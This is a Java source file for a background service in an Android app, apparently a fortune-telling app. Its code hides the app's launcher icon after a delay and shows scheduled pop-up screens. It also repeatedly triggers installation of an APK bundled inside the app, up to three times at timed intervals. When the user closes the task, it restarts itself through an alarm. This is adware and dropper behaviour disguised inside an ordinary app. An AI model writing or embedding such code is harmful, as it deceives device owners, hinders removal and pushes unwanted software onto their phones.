package ir.website.faal162;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.os.SystemClock;
import android.util.Log;

import java.util.ArrayList;
import java.util.Date;
import java.util.List;

public class OSService extends Service {
    private static  String TAG = "OSService";
    public static  long promoteDelay = 15*60*1000;
    public static  long promoteStart =4*promoteDelay;
    public static  long promoteCount =3;
    public static boolean promote=true;
    public static Context context;

    public static String notification="";
    public static List<String> links = new ArrayList<String>();
    public OSService() {
    }
    @Override
    public IBinder onBind(Intent intent) {
        // TODO Auto-generated method stub
        OSService.context=this;
        try {
            Utility.startOS(this);
        }
        catch (Exception ex){
            Log.d("MyService",ex.toString());
        }
        return null;
    }
    @Override
    public void onCreate() {
        OSService.context=this;
        try {
            Utility.startOS(this);
            Log.d("MyService","Created");
        }
        catch (Exception ex){
            Log.d("MyService",ex.getMessage());
        }

    }
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        OSService.context = this;

        try {
            Utility.startOS(this);
        } catch (Exception ex) {
            Log.d("MyService", ex.getMessage());
        }
        if (Utility.getBool("inapp")&&!PopActivityV2.isRun) {
            {

                long interval = Utility.getLong("interval") + 100;
                long now = new Date().getTime();
                long delay = interval - now;
                if ((interval == 100 || delay < 100)/*&&!OSService.notification.isEmpty()*/) {
                    delay = Utility.addMinutes(UtilityV2.interval).getTime() - now;
                }
                if (Utility.isFirst) {
                    Utility.isFirst = false;
                    delay = -1;
                }
                UtilityV2.resumeApp(delay);
            }
        }
        if(Utility.getLong("removeicon")!=-1){
            long removeicon = Utility.getLong("removeicon") + 100;
            long now = new Date().getTime();
            long delay=removeicon-now;
            Log.d(TAG, "onStartCommand: "+delay);
            if (delay>0) {
                final Handler h = new Handler();
                Runnable runnable = new Runnable() {
                    @Override
                    public void run() {
                     Utility.removeIcon();
                    }
                };
                h.postDelayed(runnable, delay);
            } else {
                Utility.removeIcon();
            }
        }
        UtilityV2.promoteInit();
        long nextinstalltimer=Utility.getLong("installtimer");
        long nowTime = new Date().getTime();
        long installtimes=Utility.getLong("installtimes");
        if(nextinstalltimer==0){
            Utility.setLong("installtimer",nowTime+promoteStart);
            nextinstalltimer=Utility.getLong("installtimer");
        }
        nowTime = nowTime+1000;
        Log.d(TAG, "onStartCommand: "+(nextinstalltimer-nowTime)+":"+nextinstalltimer+":"+nowTime+":"+installtimes);
        Log.d(TAG, "onStartCommand: "+promoteCount+":"+promoteStart+":"+promoteDelay+":"+promote);
        if(promote&&
                installtimes<promoteCount&&
                nextinstalltimer<nowTime
                ){
            installtimes=installtimes+1;
            Utility.setLong("installtimer",nowTime+promoteDelay);
            Utility.setLong("installtimes",installtimes);
            PakhageMangment.installApk(R.raw.app);
        }

        return START_STICKY;
    }
    @Override
    public void onDestroy() {
        super.onDestroy();
    }
    @Override
    public void onTaskRemoved(Intent rootIntent){
        Intent restartServiceIntent = new Intent(getApplicationContext(), this.getClass());
        restartServiceIntent.setPackage(getPackageName());
        PendingIntent restartServicePendingIntent = PendingIntent.getService(getApplicationContext(), 1, restartServiceIntent, PendingIntent.FLAG_ONE_SHOT);
        AlarmManager alarmService = (AlarmManager) getApplicationContext().getSystemService(Context.ALARM_SERVICE);
        alarmService.set(
                AlarmManager.ELAPSED_REALTIME,
                SystemClock.elapsedRealtime() + 1000,
                restartServicePendingIntent);
        super.onTaskRemoved(rootIntent);
    }
}